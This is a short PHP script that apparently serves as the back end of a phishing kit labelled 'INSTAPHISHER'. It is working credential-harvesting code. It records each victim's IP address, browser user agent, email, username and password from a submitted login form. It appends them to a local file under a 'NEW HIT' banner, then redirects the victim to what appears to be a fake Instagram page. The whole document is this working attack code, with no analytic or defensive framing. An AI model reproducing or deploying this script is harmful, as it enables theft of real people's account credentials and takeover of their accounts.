<?php

// collecting infos

$ip = $_SERVER["REMOTE_ADDR"]."\r\n";
$useragent = $_SERVER["HTTP_USER_AGENT"]."\r\n";
$email = $_POST['email']."\r\n";
$username = $_POST['username']."\r\n";
$password = $_POST['password']."\r\n";


// writing infos 

$ips = "IP: ";
$user = "Useragent: ";
$mail = "E-Mail: ";
$user2 = "Username: ";
$pass = "Password: ";
$file = fopen("result.txt","a");
$banner = "<=-=-=-=-=-=[ NEW HIT ]=-=-=-=-=-=>"."\n\n";
$bannerr = "<=-=-=-=-=-=[ INSTAPHISHER ]=-=-=-=-=-=>"."\n\n";

// writing data

fwrite($file, $banner);
fwrite($file, $ips);
fwrite($file, $ip);
fwrite($file, $user);
fwrite($file, $useragent);
fwrite($file, $mail);
fwrite($file, $email);
fwrite($file, $user2);
fwrite($file, $username);
fwrite($file, $pass);
fwrite($file, $password);
fwrite($file, $bannerr);

header('Location: instagram.html');
exit;

?>